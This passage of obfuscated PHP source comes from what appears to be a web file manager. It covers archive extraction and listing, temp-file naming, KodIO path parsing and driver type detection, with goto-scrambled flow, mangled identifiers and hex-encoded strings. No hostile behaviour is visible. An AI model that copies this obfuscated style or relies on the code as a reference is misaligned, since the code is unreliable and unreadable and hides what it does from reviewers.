array($e›ô¥Û‡Ó²[75] => $Bˆ§‹½î™); } else { if (isset($A¶ò™ä³·[$e›ô¥Û‡Ó²[369]]) && trim($A¶ò™ä³·[$e›ô¥Û‡Ó²[75]], $e›ô¥Û‡Ó²[8]) != trim($Bˆ§‹½î™, $e›ô¥Û‡Ó²[8])) { $d¹‚³É‡Š» = KodIO::make($A¶ò™ä³·[$e›ô¥Û‡Ó²[461]]); $cˆÀ†Ê¹Æ = parent::fileNameAuto($d¹‚³É‡Š», $A¶ò™ä³·[$e›ô¥Û‡Ó²[28]], REPEAT_RENAME_FOLDER, !0); $Bˆ§‹½î™ = parent::mkdir($d¹‚³É‡Š» . $cˆÀ†Ê¹Æ); $A¶ò™ä³· = array($e›ô¥Û‡Ó²[75] => $Bˆ§‹½î™); } } $Bˆ§‹½î™ = $A¶ò™ä³·[$e›ô¥Û‡Ó²[75]]; goto bŒÍÏ–²Üô; fÖ‡øê’ï: Hook::trigger($e›ô¥Û‡Ó²[1029], $Bğ‰¾Ÿ‰¥Ş); recursion_dir($Bğ‰¾Ÿ‰¥Ş, $b¶±àğ¥¦Ö, $E¦Ê“‹—, 0); $D…Çç¿ÛÎ¶ = array_merge($b¶±àğ¥¦Ö, $E¦Ê“‹—); goto e‡öÀ„÷ï‰; e×Şï¹ÚÁ…: $eØˆÏä«‘Š = KodArchive::extract($EçêƒÚÚ ”, $Bğ‰¾Ÿ‰¥Ş . $e›ô¥Û‡Ó²[8], $Dˆƒ„Òá±î); self::archiveExt(); if (!$eØˆÏä«‘Š[$e›ô¥Û‡Ó²[1026]]) { show_json($e›ô¥Û‡Ó²[1027] . $eØˆÏä«‘Š[$e›ô¥Û‡Ó²[1028]], !1); } goto fÖ‡øê’ï; D²¡´¡´¹»: mk_dir($Bğ‰¾Ÿ‰¥Ş); $cÃğêÍ‹™í = self::fileExt($DõÃù±µ¦—); $EçêƒÚÚ ” = $Bğ‰¾Ÿ‰¥Ş . $e›ô¥Û‡Ó²[91] . $cÃğêÍ‹™í; goto Cß»¤”‰á¢; DäÙ¹”ÀÓÚ: $e›ô¥Û‡Ó² =& $_SERVER[îÖ]; $fÔ³Æ÷µ¢ = $EÍâí™Ğ°Ò[$e›ô¥Û‡Ó²[75]]; $Bˆ§‹½î™ = $EÍâí™Ğ°Ò[$e›ô¥Û‡Ó²[1022]]; goto f±ÃµÈ§õ¯; Cß»¤”‰á¢: if (!@file_exists(self::iconvSystem($EçêƒÚÚ ”))) { $BƒËã¥¿É = self::localFilePath($fÔ³Æ÷µ¢, $cÃğêÍ‹™í); $EçêƒÚÚ ” = $BƒËã¥¿É ? $BƒËã¥¿É : parent::download($fÔ³Æ÷µ¢, $EçêƒÚÚ ”); } $EçêƒÚÚ ” = self::iconvSystem($EçêƒÚÚ ”); $Dˆƒ„Òá±î = isset($EÍâí™Ğ°Ò[$e›ô¥Û‡Ó²[1024]]) ? $EÍâí™Ğ°Ò[$e›ô¥Û‡Ó²[1024]] : $e›ô¥Û‡Ó²[1025]; goto e×Şï¹ÚÁ…; e‡öÀ„÷ï‰: foreach ($D…Çç¿ÛÎ¶ as $e°Ş‡Ÿîáæ) { $e°Ş‡Ÿîáæ = self::iconvApp($e°Ş‡Ÿîáæ); self::move($e°Ş‡Ÿîáæ, $Bˆ§‹½î™, $A—¨‘íÎ¨); } del_dir($Bğ‰¾Ÿ‰¥Ş); if (!$BƒËã¥¿É) { del_file($EçêƒÚÚ ”); } goto E§–Ù¶ä×ó; bŒÍÏ–²Üô: $Aœ‹øçšÅ = self::tmpFileName($DõÃù±µ¦—); $Bğ‰¾Ÿ‰¥Ş = TEMP_FILES . $Aœ‹øçšÅ; del_dir($Bğ‰¾Ÿ‰¥Ş); goto D²¡´¡´¹»; E§–Ù¶ä×ó: return !0; goto AÑ’Å†‰ ˆ; AÑ’Å†‰ ˆ: } public static function unzipList($F½Œ¹•çÀ•) { goto B´‡§ÔÓ; DÒ‡Ü›ˆĞß: self::archiveExt(); del_dir($dœìÄ’•›Ø); if (!$b´ëï—£Ş×[$f‹Î™Ü“ù[1026]]) { show_json($b´ëï—£Ş×[$f‹Î™Ü“ù[1028]], !1); } goto bíÕÌ„ƒôì; BŒ¦œ¬Ò¯•: $Fù ”ö¨ï« = 50000; if (request_url_safe($EŸ´øŠò‘›)) { $b˜’óÄ¦¾¶ = parse_url_query($EŸ´øŠò‘›); if (!isset($b˜’óÄ¦¾¶[$f‹Î™Ü“ù[75]])) { show_json($f‹Î™Ü“ù[1031], !1); } } $FªƒËµó‡ = isset($b˜’óÄ¦¾¶) ? $b˜’óÄ¦¾¶[$f‹Î™Ü“ù[75]] : $EŸ´øŠò‘›; goto Aïçğ¡æ°”; dó½Éğã ø: if (!is_dir($dœìÄ’•›Ø)) { mk_dir($dœìÄ’•›Ø); } $eÆ£¬¡‹ó³ = $dœìÄ’•›Ø . $f‹Î™Ü“ù[8] . $dùô¡ŒêœÓ; if (!@file_exists(self::iconvSystem($eÆ£¬¡‹ó³))) { if (isset($b˜’óÄ¦¾¶)) { url_request($EŸ´øŠò‘›, $f‹Î™Ü“ù[1033], $eÆ£¬¡‹ó³); } else { $a©¥ºÖçÎ¨ = self::localFilePath($EŸ´øŠò‘›, $fÚ‡Ç‰½ô); $eÆ£¬¡‹ó³ = $a©¥ºÖçÎ¨ ? $a©¥ºÖçÎ¨ : self::download($EŸ´øŠò‘›, $eÆ£¬¡‹ó³); } } goto F‹æÏ§¡Ó; fÒÆØ¶ˆŒ: return $b´ëï—£Ş×[$f‹Î™Ü“ù[1028]]; goto c—ƒÓÓã°; B´‡§ÔÓ: $f‹Î™Ü“ù =& $_SERVER[îÖ]; $EŸ´øŠò‘› = $F½Œ¹•çÀ•[$f‹Î™Ü“ù[75]]; $C¥±×ô³¥° = isset($F½Œ¹•çÀ•[$f‹Î™Ü“ù[1030]]) ? $F½Œ¹•çÀ•[$f‹Î™Ü“ù[1030]] : -1; goto BŒ¦œ¬Ò¯•; F‹æÏ§¡Ó: $eÆ£¬¡‹ó³ = self::iconvSystem($eÆ£¬¡‹ó³); if ($C¥±×ô³¥° >= 0) { $C¿ò®Şî– = isset($F½Œ¹•çÀ•[$f‹Î™Ü“ù[1034]]) ? $F½Œ¹•çÀ•[$f‹Î™Ü“ù[1034]] : !1; $cö¨¿«á˜¯ = isset($F½Œ¹•çÀ•[$f‹Î™Ü“ù[28]]) ? $F½Œ¹•çÀ•[$f‹Î™Ü“ù[28]] : $f‹Î™Ü“ù[33]; KodArchive::filePreview($eÆ£¬¡‹ó³, $C¥±×ô³¥°, $C¿ò®Şî–, $cö¨¿«á˜¯); self::archiveExt(); die; } $b´ëï—£Ş× = KodArchive::listContent($eÆ£¬¡‹ó³); goto DÒ‡Ü›ˆĞß; Aïçğ¡æ°”: $f‡Õ¦î‰áá = self::info($FªƒËµó‡); $fÚ‡Ç‰½ô = self::fileExt($f‡Õ¦î‰áá); $BÁÁ†Ñ‹ì = self::tmpFileName($f‡Õ¦î‰áá); goto B¿‡¡÷Êøµ; bíÕÌ„ƒôì: $Aê™¨İòˆ² = json_encode($b´ëï—£Ş×[$f‹Î™Ü“ù[1028]]); self::setContent($Aá„ˆ¹É¼È, $Aê™¨İòˆ²); if (count($b´ëï—£Ş×[$f‹Î™Ü“ù[1028]]) >= $Fù ”ö¨ï«) { show_json(sprintf(LNG($f‹Î™Ü“ù[1032]), count($b´ëï—£Ş×[$f‹Î™Ü“ù[1028]])), !1); } goto fÒÆØ¶ˆŒ; B¿‡¡÷Êøµ: if (isset($b˜’óÄ¦¾¶)) { $E¡°õÖ¹ˆ = array($b˜’óÄ¦¾¶[$f‹Î™Ü“ù[75]], $b˜’óÄ¦¾¶[$f‹Î™Ü“ù[1030]], $b˜’óÄ¦¾¶[$f‹Î™Ü“ù[28]]); $dùô¡ŒêœÓ = md5(implode($f‹Î™Ü“ù[70], $E¡°õÖ¹ˆ)) . $f‹Î™Ü“ù[91] . get_path_ext($b˜’óÄ¦¾¶[$f‹Î™Ü“ù[28]]); } else { $E¡°õÖ¹ˆ = array($f‡Õ¦î‰áá[$f‹Î™Ü“ù[28]], $f‡Õ¦î‰áá[$f‹Î™Ü“ù[75]], $f‡Õ¦î‰áá[$f‹Î™Ü“ù[77]]); $dùô¡ŒêœÓ = md5(implode($f‹Î™Ü“ù[70], $E¡°õÖ¹ˆ)) . $f‹Î™Ü“ù[91] . $fÚ‡Ç‰½ô; } if ($C¥±×ô³¥° == -1) { $Aá„ˆ¹É¼È = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\126\x69\x65\167\x2f{$BÁÁ†Ñ‹ì}\57{$dùô¡ŒêœÓ}\56\x6c\x6f\147"; $d‹ÆÑù¯‰µ = self::infoFull($Aá„ˆ¹É¼È); if ($d‹ÆÑù¯‰µ) { $Aá„ˆ¹É¼È = $d‹ÆÑù¯‰µ[$f‹Î™Ü“ù[75]]; $BËÅ¹î¥ö = self::getContent($Aá„ˆ¹É¼È); if ($BËÅ¹î¥ö) { $Aê™¨İòˆ² = json_decode($BËÅ¹î¥ö, !0); if (count($Aê™¨İòˆ²) >= $Fù ”ö¨ï«) { show_json(sprintf(LNG($f‹Î™Ü“ù[1032]), count($Aê™¨İòˆ²)), !1); } return $Aê™¨İòˆ²; } } else { $Aá„ˆ¹É¼È = self::mkfile($Aá„ˆ¹É¼È); } } $dœìÄ’•›Ø = TEMP_FILES . $BÁÁ†Ñ‹ì; goto dó½Éğã ø; c—ƒÓÓã°: } private static function fileExt($cöãèƒªˆ¢) { $bìÃë×§´Ô =& $_SERVER[îÖ]; $d®ˆ‹ôÛ•ö = $cöãèƒªˆ¢[$bìÃë×§´Ô[160]]; if ($d®ˆ‹ôÛ•ö == $bìÃë×§´Ô[1035]) { $A·ÂŸİÆ© = $bìÃë×§´Ô[1036]; if (substr($cöãèƒªˆ¢[$bìÃë×§´Ô[28]], -strlen($A·ÂŸİÆ©)) == $A·ÂŸİÆ©) { $d®ˆ‹ôÛ•ö = $bìÃë×§´Ô[1037]; } } self::archiveExt($d®ˆ‹ôÛ•ö); return $d®ˆ‹ôÛ•ö; } private static function zipFileList($AÌâ‰¿æ, $døÑÃäî¸› = false) { $C¥µªµ¢æİ =& $_SERVER[îÖ]; $b…ƒ„ÈšÍë = array(); foreach ($AÌâ‰¿æ as $D´¬‰•ÌÙ) { $Cã¤÷²¤¥ = $D´¬‰•ÌÙ[$C¥µªµ¢æİ[75]]; if ($døÑÃäî¸›) { $Cã¤÷²¤¥ = self::copy($D´¬‰•ÌÙ[$C¥µªµ¢æİ[75]], $døÑÃäî¸›, $C¥µªµ¢æİ[744]); } if ($Cã¤÷²¤¥ && self::local()->exist($Cã¤÷²¤¥)) { $b…ƒ„ÈšÍë[$D´¬‰•ÌÙ[$C¥µªµ¢æİ[75]]] = $Cã¤÷²¤¥; } } if (!empty($b…ƒ„ÈšÍë)) { return array_values($b…ƒ„ÈšÍë); } show_json(LNG($C¥µªµ¢æİ[1038]), !1); } public static function tmpFileName($e†ã‘ÛŒÈ³) { $DŒÔˆÓ‰ç  =& $_SERVER[îÖ]; $b‰Ñ·‹š… = array($e†ã‘ÛŒÈ³[$DŒÔˆÓ‰ç [28]], $e†ã‘ÛŒÈ³[$DŒÔˆÓ‰ç [75]], $e†ã‘ÛŒÈ³[$DŒÔˆÓ‰ç [77]], $e†ã‘ÛŒÈ³[$DŒÔˆÓ‰ç [459]]); return md5(implode($DŒÔˆÓ‰ç [70], $b‰Ñ·‹š…)); } private static function localFilePath($Eğ¡ ªŠ£, $d™•äÜóÔ) { goto fÜíœõ¨»; A‚‡Æ¨…Ğ: if ($CˆŸ•õ‘‹[$DçáÁõÓé¶[29]] == KodIO::KOD_SOURCE) { $b¢¿½Á‹è½ = Model($DçáÁõÓé¶[752])->fileInfoGet(KodIO::sourceID($Eğ¡ ªŠ£)); if (!$b¢¿½Á‹è½[$DçáÁõÓé¶[75]]) { show_json($DçáÁõÓé¶[1041], !1); } $Eğ¡ ªŠ£ = $b¢¿½Á‹è½[$DçáÁõÓé¶[75]]; } $eŞîØàäô¨ = self::init($Eğ¡ ªŠ£); $DÍØ‚·÷ëÈ = $eŞîØàäô¨->getType(); goto cœèÙÖ˜ºÑ; fÜíœõ¨»: $DçáÁõÓé¶ =& $_SERVER[îÖ]; if ($d™•äÜóÔ == $DçáÁõÓé¶[1039] && strtoupper(substr(PHP_OS, 0, 3)) == $DçáÁõÓé¶[1040]) { return !1; } $CˆŸ•õ‘‹ = KodIO::parse($Eğ¡ ªŠ£); goto A‚‡Æ¨…Ğ; cœèÙÖ˜ºÑ: if ($DÍØ‚·÷ëÈ == $DçáÁõÓé¶[102] || $DÍØ‚·÷ëÈ == $DçáÁõÓé¶[1042]) { if (!$eŞîØàäô¨->exist($eŞîØàäô¨->path)) { show_json(LNG($DçáÁõÓé¶[101]), !1); } return $eŞîØàäô¨->path; } return !1; goto d„¼“³ìñ™; d„¼“³ìñ™: } private static function archiveExt($D­ƒ¹ìí‰¢ = '') { $GLOBALS[$_SERVER[îÖ][1043]] = $D­ƒ¹ìí‰¢; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\162\122\x65\x63\x79\143\154\145\175"; const KOD_USER_FAV = "\173\x75\x73\145\162\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\x72\x46\x69\x6c\x65\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\x72\106\x69\x6c\x65\x54\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\165\160\122\x6f\x6f\x74\x53\x65\154\x66\175"; const KOD_USER_SHARE = "\x7b\165\163\x65\162\123\x68\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\x72\x53\x68\141\x72\x65\x4c\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\162\145\x54\x6f\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\162\x65\x49\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\x73\150\141\162\145\x49\164\x65\x6d\114\151\x6e\153\x7d"; const KOD_SEARCH = "\173\163\145\x61\x72\143\150\175"; const KOD_BLOCK = "\x7b\142\154\x6f\143\x6b\x7d"; const KOD_IO = "\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\x73\x65\162\122\145\x6e\x63\x65\156\164\175"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\x76\x65\162\175"; public static function typeList() { $Dµ–Ü®è† =& $_SERVER[îÖ]; return array($Dµ–Ü®è†[1044] => self::KOD_SOURCE, $Dµ–Ü®è†[1045] => self::KOD_USER_RECYCLE, $Dµ–Ü®è†[1046] => self::KOD_USER_FAV, $Dµ–Ü®è†[1047] => self::KOD_USER_FILE_TAG, $Dµ–Ü®è†[1048] => self::KOD_USER_FILE_TYPE, $Dµ–Ü®è†[1049] => self::KOD_GROUP_ROOT_SELF, $Dµ–Ü®è†[1050] => self::KOD_USER_SHARE, $Dµ–Ü®è†[1051] => self::KOD_USER_SHARE_LINK, $Dµ–Ü®è†[1052] => self::KOD_USER_SHARE_TO_ME, $Dµ–Ü®è†[1053] => self::KOD_SHARE_ITEM, $Dµ–Ü®è†[1054] => self::KOD_SHARE_LINK, $Dµ–Ü®è†[1055] => self::KOD_SEARCH, $Dµ–Ü®è†[1056] => self::KOD_BLOCK, $Dµ–Ü®è†[1057] => self::KOD_IO, $Dµ–Ü®è†[1058] => self::KOD_USER_RECENT, $Dµ–Ü®è†[1059] => self::KOD_USER_DRIVER); } public static function parse($A½«„¥³”¾) { goto DÈäá®”Šâ; DÈäá®”Šâ: $Fä˜äÓßà¼ =& $_SERVER[îÖ]; $A½«„¥³”¾ = self::clear($A½«„¥³”¾); $C÷ËâÑãÖ  = array_values(self::typeList()); goto AœˆÀ”ÈÎõ; AœˆÀ”ÈÎõ: preg_match($Fä˜äÓßà¼[1060], $A½«„¥³”¾, $F£ÔÖß„©“); $b½ËŒˆÈ = array($Fä˜äÓßà¼[388] => !1, $Fä˜äÓßà¼[1061] => !1, $Fä˜äÓßà¼[385] => !1, $Fä˜äÓßà¼[75] => $A½«„¥³”¾, $Fä˜äÓßà¼[1007] => !1, $Fä˜äÓßà¼[1006] => $Fä˜äÓßà¼[33]); if (is_array($F£ÔÖß„©“) && count($F£ÔÖß„©“) == 5) { $FĞ©©‰ºÆ = $Fä˜äÓßà¼[1062] . $F£ÔÖß„©“[2] . $Fä˜äÓßà¼[315]; if (in_array($FĞ©©‰ºÆ, $C÷ËâÑãÖ )) { $b½ËŒˆÈ[$Fä˜äÓßà¼[1007]] = $F£ÔÖß„©“[1]; $b½ËŒˆÈ[$Fä˜äÓßà¼[29]] = $FĞ©©‰ºÆ; $b½ËŒˆÈ[$Fä˜äÓßà¼[1063]] = substr($FĞ©©‰ºÆ, 1, -1); $b½ËŒˆÈ[$Fä˜äÓßà¼[367]] = $F£ÔÖß„©“[3]; } $b½ËŒˆÈ[$Fä˜äÓßà¼[1006]] = $F£ÔÖß„©“[4]; } goto dÔÒÉ‘ÉŸß; dÔÒÉ‘ÉŸß: $eÚ®’®‰˜Ô = array($Fä˜äÓßà¼[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $b½ËŒˆÈ[$Fä˜äÓßà¼[1064]] = in_array($b½ËŒˆÈ[$Fä˜äÓßà¼[29]], $eÚ®’®‰˜Ô); return $b½ËŒˆÈ; goto a†‡œ¶ˆ–£; a†‡œ¶ˆ–£: } public static function clear($FĞ×“ÂË‡Š) { goto FÂ³¹ùãïå; FÂ³¹ùãïå: $AÆ…ÀÉÚÒ =& $_SERVER[îÖ]; $FĞ×“ÂË‡Š = str_replace(array($AÆ…ÀÉÚÒ[986], $AÆ…ÀÉÚÒ[217]), $AÆ…ÀÉÚÒ[50], $FĞ×“ÂË‡Š); $FĞ×“ÂË‡Š = str_replace($AÆ…ÀÉÚÒ[93], $AÆ…ÀÉÚÒ[8], $FĞ×“ÂË‡Š); goto d…Ò’¢²êƒ; B«¡½êŞª: $FĞ×“ÂË‡Š = preg_replace($AÆ…ÀÉÚÒ[1067], $AÆ…ÀÉÚÒ[8], $FĞ×“ÂË‡Š); if ($FĞ×“ÂË‡Š == $AÆ…ÀÉÚÒ[8]) { return $AÆ…ÀÉÚÒ[8]; } $FĞ×“ÂË‡Š = rtrim($FĞ×“ÂË‡Š, $AÆ…ÀÉÚÒ[8]); goto Fö†êŸ ×; d…Ò’¢²êƒ: $EÉ“¬±ÍŒ = $AÆ…ÀÉÚÒ[1065]; if (substr($FĞ×“ÂË‡Š, 0, 3) == $AÆ…ÀÉÚÒ[1066]) { $FĞ×“ÂË‡Š = substr($FĞ×“ÂË‡Š, 3); } while (strstr($FĞ×“ÂË‡Š, $EÉ“¬±ÍŒ)) { $FĞ×“ÂË‡Š = str_replace($EÉ“¬±ÍŒ, $AÆ…ÀÉÚÒ[8], $FĞ×“ÂË‡Š); } goto B«¡½êŞª; Fö†êŸ ×: return $FĞ×“ÂË‡Š; goto d¤¥ø¾àÅ; d¤¥ø¾àÅ: } public static function sourceID($bÓÄÇ¿ÁÙ®) { $Fõ è² =& $_SERVER[îÖ]; $Fò»ƒò±«’ = self::parse($bÓÄÇ¿ÁÙ®); if ($Fò»ƒò±«’[$Fõ è²[29]] !== self::KOD_SOURCE) { show_json(LNG($Fõ è²[1068]), !1); } return $Fò»ƒò±«’[$Fõ è²[367]]; } public static function make($BšÄ¢¯Ğ‹Á) { if (!$BšÄ¢¯Ğ‹Á) { return !1; } return self::makePath(self::KOD_SOURCE, intval($BšÄ¢¯Ğ‹Á)); } public static function makeShare($DØ“ßÄ‡Ş­, $aŠñãÄ ¼ã) { return self::makePath(self::KOD_SHARE_ITEM, $DØ“ßÄ‡Ş­, $aŠñãÄ ¼ã); } public static function makeFileTypePath($F‰«Ç¿ßëê) { return self::makePath(self::KOD_USER_FILE_TYPE, $F‰«Ç¿ßëê); } public static function makeFileTagPath($CÅÕ¥Ûˆ©) { return self::makePath(self::KOD_USER_FILE_TAG, $CÅÕ¥Ûˆ©); } public static function makePath($eÖÅ¼ï»õå, $CÅ·àæ±á’ = '', $aˆ‚ãÊŒˆ = '') { $fâ´ÅÙº‡ =& $_SERVER[îÖ]; $BñÏáŒÄ´ = substr($eÖÅ¼ï»õå, 1, -1); $E‡´•ˆêìË = $fâ´ÅÙº‡[1069] . $BñÏáŒÄ´ . $fâ´ÅÙº‡[1070] . $CÅ·àæ±á’ . $fâ´ÅÙº‡[1071]; $E‡´•ˆêìË = $aˆ‚ãÊŒˆ ? $E‡´•ˆêìË . $aˆ‚ãÊŒˆ . $fâ´ÅÙº‡[8] : $E‡´•ˆêìË; return $E‡´•ˆêìË; } public static function hashPath($Eï®›è) { $dÈÃã×÷‚Ş =& $_SERVER[îÖ]; $dÓ™Ÿ²Á”è = is_array($Eï®›è) ? $Eï®›è : IO::info($Eï®›è); $aÆ‰²ÔµĞ³ = _get($dÓ™Ÿ²Á”è, $dÈÃã×÷‚Ş[1072], $dÈÃã×÷‚Ş[33]); if (!$aÆ‰²ÔµĞ³) { $fÎÇÕÚ¥ğ¡ = KodIO::parse($dÓ™Ÿ²Á”è[$dÈÃã×÷‚Ş[75]]); if (!$fÎÇÕÚ¥ğ¡[$dÈÃã×÷‚Ş[29]]) { $aÆ‰²ÔµĞ³ = IO::hashSimple($dÓ™Ÿ²Á”è[$dÈÃã×÷‚Ş[75]]); } } if (!$aÆ‰²ÔµĞ³) { $aÆ‰²ÔµĞ³ = md5($dÓ™Ÿ²Á”è[$dÈÃã×÷‚Ş[75]] . $dÓ™Ÿ²Á”è[$dÈÃã×÷‚Ş[77]] . $dÓ™Ÿ²Á”è[$dÈÃã×÷‚Ş[107]]); } return $aÆ‰²ÔµĞ³; } public static function initSystemPath() { $c×Ó‹ÉØš‚ =& $_SERVER[îÖ]; if (defined($c×Ó‹ÉØš‚[1073])) { return; } define($c×Ó‹ÉØš‚[1073], self::systemPath($c×Ó‹ÉØš‚[1074])); define($c×Ó‹ÉØš‚[1075], self::systemPath($c×Ó‹ÉØš‚[1076])); define($c×Ó‹ÉØš‚[1077], self::systemPath($c×Ó‹ÉØš‚[1078])); define($c×Ó‹ÉØš‚[1079], self::systemPath($c×Ó‹ÉØš‚[1080])); } private static function systemPath($cËÃ´óÙİ) { goto DØÊ’ÚÔ¿ñ; DÏÛÖ÷÷ùÚ: if ($fƒîØíéôŒ) { return $fƒîØíéôŒ; } if ($cËÃ´óÙİ == $cßÈ½ÄÇ[1074]) { $fƒîØíéôŒ = self::make(Model($cßÈ½ÄÇ[752])->systemRootPathAdd($cßÈ½ÄÇ[1083])); } else { $fƒîØíéôŒ = self::systemPath($cßÈ½ÄÇ[1074]); $c°¬íø‚†Ç = self::sourceID($fƒîØíéôŒ); $fƒîØíéôŒ = self::make(Model($cßÈ½ÄÇ[752])->mkdir($c°¬íø‚†Ç, $cËÃ´óÙİ)); } Model($cßÈ½ÄÇ[1082])->set($DÑñ³º×Âä, $fƒîØíéôŒ); goto dÛÓ‹ÜËÉÙ; DØÊ’ÚÔ¿ñ: $cßÈ½ÄÇ =& $_SERVER[îÖ]; $DÑñ³º×Âä = $cßÈ½ÄÇ[1081] . ucfirst($cËÃ´óÙİ); $fƒîØíéôŒ = Model($cßÈ½ÄÇ[1082])->get($DÑñ³º×Âä); goto DÏÛÖ÷÷ùÚ; dÛÓ‹ÜËÉÙ: return $fƒîØíéôŒ; goto d…øì•î¶ª; d…øì•î¶ª: } public static function systemFolder($dÜÚ¨„‹Ş) { $fï¢¢³ ˆ­ = IO_PATH_SYSTEM_SOURCE . $dÜÚ¨„‹Ş; $aé½Ãèˆ¶‰ = Cache::get($fï¢¢³ ˆ­); if (!$aé½Ãèˆ¶‰) { $d­´ê‹ŸİŒ = IO::infoFull($fï¢¢³ ˆ­); if (!$d­´ê‹ŸİŒ) { $aé½Ãèˆ¶‰ = IO::mkdir($fï¢¢³ ˆ­, REPEAT_SKIP); } else { $aé½Ãèˆ¶‰ = $d­´ê‹ŸİŒ[$_SERVER[îÖ][75]]; } Cache::set($fï¢¢³ ˆ­, $aé½Ãèˆ¶‰, 3600 * 10); } return $aé½Ãèˆ¶‰; } public static function defaultDriver() { return Model($_SERVER[îÖ][703])->defaultDriver(); } public static function defaultIO() { $E×ùÏæ½† =& $_SERVER[îÖ]; $aß´»Û³ù• = self::defaultDriver(); return $E×ùÏæ½†[1084] . $aß´»Û³ù•[$E×ùÏæ½†[367]] . $E×ùÏæ½†[1071]; } public static function defaultDriverInit() { static $c¸Ê×ŸÑ¤Ë = false; if ($c¸Ê×ŸÑ¤Ë) { return $c¸Ê×ŸÑ¤Ë; } $c¸Ê×ŸÑ¤Ë = IO::init(self::defaultIO()); return $c¸Ê×ŸÑ¤Ë; } public static function fileTypeList() { $EŒàĞìŠ¹Ş =& $_SERVER[îÖ]; $DŸàîŠòª = $GLOBALS[$EŒàĞìŠ¹Ş[6]][$EŒàĞìŠ¹Ş[1085]]; foreach ($DŸàîŠòª as $fÑÏ‹«²·„ => $e´®…ŠÎ¬) { $f»”öÚê“ = $EŒàĞìŠ¹Ş[1086] . $fÑÏ‹«²·„; $eÙÑ’®¢’ = LNG($f»”öÚê“); if ($f»”öÚê“ != $eÙÑ’®¢’) { $DŸàîŠòª[$fÑÏ‹«²·„][$EŒàĞìŠ¹Ş[28]] = $eÙÑ’®¢’; } } return $DŸàîŠòª; } public static function transferType($F…Š™Êìô, $b‡Š«ƒ•½Á) { goto A»¯»¿”ÃÆ; A»¯»¿”ÃÆ: $e…‘ œì®˜ =& $_SERVER[îÖ]; $d•ğ¶ÉèĞ = self::driverType($F…Š™Êìô); $dœ ËîöìÁ = self::driverType($b‡Š«ƒ•½Á); goto BèèŒåÀøƒ; BèèŒåÀøƒ: if ($d•ğ¶ÉèĞ[$e…‘ œì®˜[29]] == $dœ ËîöìÁ[$e…‘ œì®˜[29]] && $d•ğ¶ÉèĞ[$e…‘ œì®˜[1087]] == $dœ ËîöìÁ[$e…‘ œì®˜[1087]]) { return $e…‘ œì®˜[1088]; } if ($d•ğ¶ÉèĞ[$e…‘ œì®˜[29]] == $e…‘ œì®˜[779] && $dœ ËîöìÁ[$e…‘ œì®˜[29]] == $e…‘ œì®˜[102]) { return $e…‘ œì®˜[1034]; } if ($d•ğ¶ÉèĞ[$e…‘ œì®˜[29]] == $e…‘ œì®˜[102] && $dœ ËîöìÁ[$e…‘ œì®˜[29]] == $e…‘ œì®˜[779]) { return $e…‘ œì®˜[103]; } goto cÎ‹Ñ¬¯‰Ô; cÎ‹Ñ¬¯‰Ô: return $e…‘ œì®˜[1089]; goto C§¯ŠÅ—í¢; C§¯ŠÅ—í¢: } public static function driverType($C¤’‰É–Ïí) { goto EùãØ½ˆÃé; fæ¹¡Œ³£î: if ($c¿ôÓ—œº½ == $e˜ÊìÓÙÜƒ[693] || $c¿ôÓ—œº½ == $e˜ÊìÓÙÜƒ[1091] || $c¿ôÓ—œº½ == $e˜ÊìÓÙÜƒ[1092]) { $C¤’‰É–Ïí = self::defaultDriverInit(); } else { if ($c¿ôÓ—œº½ == $e˜ÊìÓÙÜƒ[1042] || $c¿ôÓ—œº½ == $e˜ÊìÓÙÜƒ[1093]) { $C¤’‰É–Ïí = IO::init($C¤’‰É–Ïí->pathParse[$e˜ÊìÓÙÜƒ[992]]); } } $c¿ôÓ—œº½ = str_replace($e˜ÊìÓÙÜƒ[1090], $e˜ÊìÓÙÜƒ[33], strtolower($C¤’‰É–Ïí->getType())); if ($c¿ôÓ—œº½ == $e˜ÊìÓÙÜƒ[102]) { return array($e˜ÊìÓÙÜƒ[29] => $e˜ÊìÓÙÜƒ[102], $e˜ÊìÓÙÜƒ[1087] => $e˜ÊìÓÙÜƒ[33], $e˜ÊìÓÙÜƒ[75] => $a¦ÁìòšÂô); } goto E“‹ÈÚÄ®„; EùãØ½ˆÃé: $e˜ÊìÓÙÜƒ =& $_SERVER[îÖ]; $a¦ÁìòšÂô = $C¤’‰É–Ïí->path; $c¿ôÓ—œº½ = str_replace($e˜ÊìÓÙÜƒ[1090], $e˜ÊìÓÙÜƒ[33], strtolower($C¤’‰É–Ïí->getType())); goto fæ¹¡Œ³£î; E“‹ÈÚÄ®„: return array($e˜ÊìÓÙÜƒ[29] => $e˜ÊìÓÙÜƒ[779], $e˜ÊìÓÙÜƒ[1087] => $C¤’‰É–Ïí->pathDriver, $e˜ÊìÓÙÜƒ[75] => $a¦ÁìòšÂô); goto cÍ¦ŞÇ¼ä¦; cÍ¦ŞÇ¼ä¦: } } goto AÚôåöÊ…º; B‡ãĞƒ™Õ‡: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\x63\x65\x5f\x68\x69\163\164\157\162\x79"; public function addHistory($dĞÔó·äí, $D©®š¥ÀÁÀ = '') { $f¡§ù©Åô¥ =& $_SERVER[îÖ]; $Dª¶¤·…×— = array($f¡§ù©Åô¥[383] => $dĞÔó·äí[$f¡§ù©Åô¥[369]], $f¡§ù©Åô¥[1422] => isset($dĞÔó·äí[$f¡§ù©Åô¥[379]]) ? $dĞÔó·äí[$f¡§ù©Åô¥[379]] : $dĞÔó·äí[$f¡§ù©Åô¥[378]], $f¡§ù©Åô¥[420] => $dĞÔó·äí[$f¡§ù©Åô¥[419]], $f¡§ù©Åô¥[520] => $dĞÔó·äí[$f¡§ù©Åô¥[77]], $f¡§ù©Åô¥[2297] => 